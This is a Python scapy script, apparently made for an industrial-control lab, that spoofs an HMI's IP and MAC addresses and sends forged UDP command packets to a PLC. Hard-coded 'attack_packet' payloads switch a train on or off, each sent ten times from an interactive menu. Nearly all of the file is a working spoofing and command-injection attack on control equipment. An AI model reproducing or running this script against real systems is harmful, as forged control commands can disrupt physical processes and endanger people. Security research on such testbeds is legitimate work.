# -*- coding: utf-8 -*-
import scapy.all as scapy
from random import randint
import threading, os, sys, optparse
import atexit
import time
from construct import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.layers.inet import UDP, IP

# ---------------------------------------
LocalIP = "192.168.3.103"
LocalMac  = "00:e0:4c:68:f9:4b"

HMI_IP = "192.168.3.18"
HMI_MAC = "28:e9:8e:24:bb:e0"

PLC_IP = "192.168.3.39"  # TargetM_IP
PLC_MAC = "30:be:3b:8a:1a:f9"

# ---------------------------------------

flag = 0

MITZ_LINK = Struct(
    'type' / Int16ul,
    'seq1' / Int16ul,
    'idk1' / Bytes(0xf),
    'length' / Int16ul,
    'idk2' / IfThenElse(this.type == 0x57, Bytes(0xe), Bytes(0x10)),
    'seq2' / Int8ul,
    'pad' / IfThenElse(this.type == 0x57, Bytes(this.length - 0xe - 1), Bytes(this.length - 0x10 - 1))
)

#                   "57 | 01 00 00 01 | 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00"      #?


attack_packet_off="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 "
attack_packet_on="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 00"


def Send_TRAIN_OFF():
    data_off = bytes.fromhex(attack_packet_off)
    udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    for _ in range(10):
        sendp(udpf)
    # udpf = Ether(src=PLC_MAC, dst=PLC_MAC) / IP(src=HMI_IP , dst=PLC_IP) / UDP(sport=5001, dport=5006) / ("00 11 22")
    # sendp(udpf)
    print("TRAIN OFF \n")
    # time.sleep(1)

def Send_TRAIN_ON():
    data_on = bytes.fromhex(attack_packet_on)
    udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_on)
    for _ in range(10):
        sendp(udpf)
    print("TRAIN ON\n")
    # time.sleep(1)
    
def main():
    while True:
        #print()
        user_input = input("Enter a number (1:TRAIN ON (10 packets);2:TRAIN OFF (10 packets);Others: Exit):")
        if user_input not in ['1', '2']:
            print("Bye")
            exit(0)
        if user_input == '1':
            Send_TRAIN_ON()
        if user_input == '2':
            Send_TRAIN_OFF()

    

if __name__ == '__main__':
    main()
